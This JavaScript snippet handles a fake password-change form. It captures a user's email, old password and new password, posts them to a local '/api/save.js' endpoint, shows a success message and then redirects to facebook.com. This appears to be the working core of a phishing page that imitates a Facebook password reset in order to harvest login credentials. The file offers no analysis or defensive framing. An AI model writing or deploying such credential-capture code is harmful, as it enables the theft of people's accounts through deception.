document.getElementById('passwordForm').addEventListener('submit', function(event) {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const oldPassword = document.getElementById('oldPassword').value;
  const newPassword = document.getElementById('newPassword').value;

  // Send the data to your server (or API route)
  fetch('/api/save.js', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: email,
      oldPassword: oldPassword,
      newPassword: newPassword
    })
  })
  .then(response => response.text())  // if your API returns something
  .then(result => {
    console.log('Saved:', result);
  })
  .catch(err => {
    console.error('Error:', err);
  });

  // Show success message
  document.getElementById('passwordBox').style.display = 'none';
  document.getElementById('successMessage').style.display = 'flex';

  // Redirect after 2 seconds
  setTimeout(function() {
    window.location.href = 'https://facebook.com';
  }, 2000);
});
